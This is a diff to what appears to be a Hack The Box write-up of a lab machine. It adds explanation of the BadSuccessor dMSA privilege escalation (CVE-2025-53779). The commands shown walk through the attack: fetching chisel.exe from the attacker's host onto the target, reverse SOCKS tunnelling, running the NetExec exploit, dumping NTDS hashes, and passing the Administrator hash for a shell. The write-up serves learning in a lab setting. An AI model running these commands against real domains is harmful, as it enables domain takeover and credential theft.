@@ -275,8 +275,11 @@ To analyse the results, I made use of the bloodhound docker file [found here](ht
 
 ## Bad Successor
 
-With the explore into bloodhound not revealing anything concrete to go from, I searched for priv esc vulnerabilities associated with the windows server 2025 datacenter. Very quickly, CVE-2025-53779 began to stand out as a likely candidate, with several articles explaining the mechanism behind the exploit. In particular the [Akamai article](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory), who I beleve were first to break the news of this vulnerability, was especially useful in improving my understanding. The vulnerability relies on a feature implemented in windows datacenter 2025 to migrate legacy service accounts to the latest authentication mechanisms provided by kerberos. Typically, when a legacy service account would request permission from the Ticket Granting Ticket (TGT) server, the server would migrate the legacy account to a delegated managed service account (dMSA). However, if an attacker has the ability to make a dMSA manually and the attacker can control the migration status of that dMSA, the attacker can convince the TGT server that the dMSA they control should be granted the permissions of another account. In the worst case scenario, the attacker could convince the TGT server that the dMSA should inherit the administrators permissions, effectively granting the attacker an account that can perform actions as if they were the administrator.
+With the explore into bloodhound not revealing anything concrete to go from, I searched for priv esc vulnerabilities associated with the windows server 2025 datacenter. Very quickly, CVE-2025-53779 began to stand out as a likely candidate, with several articles explaining the mechanism behind the exploit. In particular the [Akamai article](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory), who I beleve were first to break the news of this vulnerability, was especially useful in improving my understanding. The vulnerability relies on a feature implemented in windows datacenter 2025 to migrate legacy service accounts to the latest authentication mechanisms provided by kerberos. Typically, when a legacy service account would request permission from the Ticket Granting Ticket (TGT) server, the server would migrate the legacy account to a delegated managed service account (dMSA). However, if an attacker has the ability to make a dMSA manually and the attacker can control the migration status of that dMSA, the attacker can convince the TGT server that the dMSA they control should be granted the permissions of another account. In the worst case scenario, the attacker could convince the TGT server that the dMSA should inherit the administrator's permissions, effectively granting the attacker an account that can perform actions as if they were the administrator.
 
+To begin exploiting the environment, I needed a way to interact with the Windows Active Directory services from my Linux machine. After researching various walkthroughs, I came across a tool called Chisel, which was another new tool for me. Chisel uses a client-server model to establish an encrypted TCP tunnel over HTTP, using SSH encryption to secure the connection. It also supports SOCKS5 proxying, allowing applications and scripts running locally to send network traffic through a remote machine.
+
+In this example, my Linux machine hosted the Chisel server with reverse tunnelling enabled, while the Windows machine connected as the Chisel client. By configuring a reverse SOCKS5 proxy (R:socks), I could run tools such as NetExec locally on Linux while routing their network traffic through the Windows machine. This effectively allowed me to leverage the Windows machine's network connectivity to communicate with Active Directory services that were not directly accessible from my Linux machine.
 
 ```bash
 *Evil-WinRM* PS C:\programdata> wget http://10.10.14.77:8080/chisel.exe -outfile chisel.exe
@@ -290,9 +293,7 @@ With the explore into bloodhound not revealing anything concrete to go from, I s
 /chisel server -p 8080 --socks5 --reverse
 ```
 
-```bash
-proxychains netexec smb dc01.eighteen.htb
-```
+With the tunnel established, I configured proxychains to use my local port 1080 to redirect the traffic to the windows server. By default, netexec has a module that will check whether a user has the necessary permissions over an Organizational Unit (OU). In this case, the owned user Amam Scott has the correct permissions over the IT OU.
 
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -311,6 +312,8 @@ BADSUCCE... 10.129.97.251   389    DC01             [+] Found 1 results
 BADSUCCE... 10.129.97.251   389    DC01             IT (S-1-5-21-1152179935-589108180-1989892463-1604), OU=Staff,DC=eighteen,DC=htb
 ```
 
+At the time of writing this post netexec is at version 1.5.1, however a planned feature for v1.6 is an expansion to the badsuccessor module that will automatically perform the exploit. To get the automated version, I created a new branch in line with the relevent pull request and used uv to build a new version of netexec. 
+
 ```bash
 ┌──(kali㉿kali)-[/opt/NetExec]
 └─$ git fetch origin pull/1163/head:badsuccessor
@@ -325,6 +328,8 @@ From https://github.com/Pennyw0rth/NetExec
 └─$ git checkout badsuccessor                   
 Switched to branch 'badsuccessor'
 ```
+
+In the feature branch version, the badsuccessor module takes additional arguments. An OU is specified, in this case the unit associated with the IT sid. I can also specify a name for the delegated Managed Service Account (dMSA) as well as the account that I'd like it copy the permissions from. Again, the proxychains tool lets the traffic from these commands exit on the windows machine. Despite this, the exploit fails with the error 'clock skew too great'.
 
 ```bash
 ┌──(kali㉿kali)-[/opt/NetExec]
@@ -350,6 +355,8 @@ BADSUCCE... 10.129.97.251   389    DC01             Target account: CN=Administr
 BADSUCCE... 10.129.97.251   389    DC01             [-] Failed to get TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
 
+The root of this issue stems from the fact that the TGT gives out certificates with the account permissions embedded inside them. Because my linux machines clock is out of sync with the clock on the windows machine, we likely cannot agree on an issue time and an expirary time since I am presenting a time that is too far in the future or the past. To fix this, I'll prevent my linux machine from fetching a new time from the internet and make both machines time settings match.
+
 ```bash
 *Evil-WinRM* PS C:\Users\adam.scott\Documents> Get-Date
 
@@ -358,21 +365,12 @@ Thursday, November 12, 2026 1:08:25 PM
 ```bash
 ┌──(kali㉿kali)-[/opt/NetExec]
 └─$ sudo timedatectl set-ntp false
-[sudo] password for kali: 
-                                                                                                                                                                 
+
 ┌──(kali㉿kali)-[/opt/NetExec]
 └─$ sudo timedatectl set-time "2026-11-12 13:09:20"
-                                                                                                                                                                  
-┌──(kali㉿kali)-[/opt/NetExec]
-└─$ timedatectl status                                                          
-               Local time: Thu 2026-11-12 13:09:36 EST
-           Universal time: Thu 2026-11-12 18:09:36 UTC
-                 RTC time: Thu 2026-11-12 18:09:37
-                Time zone: America/New_York (EST, -0500)
-System clock synchronized: no
-              NTP service: inactive
-          RTC in local TZ: no
 ```
+
+This time, the expoit works and I am granted a service ticket for the 'generic_dmsa' account which, thanks to the flaw in dMSA service account migration, can now perform actions usually reserved for the administrator. I'll save this service ticket for the next step.
 
 ```bash
 ┌──(kali㉿kali)-[/opt/NetExec]                                                                                                                                    
@@ -407,6 +405,8 @@ BADSUCCE... 10.129.97.251   389    DC01             EncryptionTypes.rc4_hmac: 0b
 BADSUCCE... 10.129.97.251   389    DC01             [+] Service ticket saved to /home/kali/.nxc/modules/badsuccessor/generic_dmsa$.ccache
 ```
 
+With a service ticket for the generic_dmsa account in my pocket, all that was left to do was become the Administrator. Since my generic_dmsa service ticket gives me the same permissions as the admin, I can dump the ntds hashes.
+
 ```bash
 ┌──(kali㉿kali)-[/opt/NetExec]
 └─$ KRB5CCNAME=/home/kali/.nxc/modules/badsuccessor/generic_dmsa\$.ccache proxychains -q netexec smb dc01.eighteen.htb --use-kcache --ntds 
@@ -431,24 +431,18 @@ SMB         dc01.eighteen.htb 445    DC01             [*] To extract only enable
 SMB         dc01.eighteen.htb 445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_dc01.eighteen.htb_2026-11-12_220051.ntds | cut -d ':' -f1
 ```
 
-```bash
+Finally, with the Administrators NTLM hash recovered, I can use the hash to pass winrm authentication as the user administrator and collect the root flag!
+
+```ps
 ┌──(kali㉿kali)-[/opt/NetExec]                                                                                                                                    
 └─$ evil-winrm -i dc01.eighteen.htb -u administrator -H 0b133be956bfaddf9cea56701affddec                                                                          
-                                                                                                                                                                  
-Evil-WinRM shell v3.9                                                                                                                                             
-                                                                                                                                                                  
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                  
-                                                                                                                                                                  
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
-Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 eighteen\administrator
-```
 
-```bash
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
 eighteen\administrator
+
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
 306*************************3b1c
 ```
